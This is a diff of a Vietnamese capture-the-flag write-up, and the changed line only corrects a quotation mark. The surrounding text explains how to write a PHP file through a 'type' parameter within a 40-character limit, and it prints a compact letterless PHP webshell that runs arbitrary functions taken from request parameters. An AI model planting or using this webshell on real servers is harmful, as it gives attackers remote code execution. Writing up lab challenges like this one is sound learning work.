@@ -223,7 +223,7 @@ Sự khác nhau cơ bản nhất giữa chúng là:
 
 Mục tiêu của ta là viết một webshell là php code, nhưng sẽ rất khó để định nghĩa một biến hay một chuỗi mà không chứa các ký tự như `$, ', "` hoặc cơ bản nhất nhất là dấu `;` để phân tách các dòng code với nhau. Do vậy, `omega_sector.php` sẽ không sử dụng được => vậy chỉ còn lại `alien_sector.php` mà thôi!!  
   
-Param `type` khi post lên sẽ là `extension` của file khi mà webserver sẽ lưu trữ, nên ta có thể đổi thành `type=php` để viết `php file`. Tra google thì có rất nhiều cách bypass để write webshell mà không dùng letter, nhưng một thứ cản trở ta làm được việc đó chính là bị giới hạn ký tự, cụ thể chỉ cho phép viết một `"message` chỉ 40 chars. Nhưng may mắn thay, mình tìm được một [webshell](https://gist.github.com/mvisat/03592a5ab0743cd43c2aa65bf45fef21) chỉ chứa đúng vỏn vẹn là 40 ký tự thôi.  
+Param `type` khi post lên sẽ là `extension` của file khi mà webserver sẽ lưu trữ, nên ta có thể đổi thành `type=php` để viết `php file`. Tra google thì có rất nhiều cách bypass để write webshell mà không dùng letter, nhưng một thứ cản trở ta làm được việc đó chính là bị giới hạn ký tự, cụ thể chỉ cho phép viết một `"message"` chỉ 40 chars. Nhưng may mắn thay, mình tìm được một [webshell](https://gist.github.com/mvisat/03592a5ab0743cd43c2aa65bf45fef21) chỉ chứa đúng vỏn vẹn là 40 ký tự thôi.  
 ```php  
 <?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
 ```  
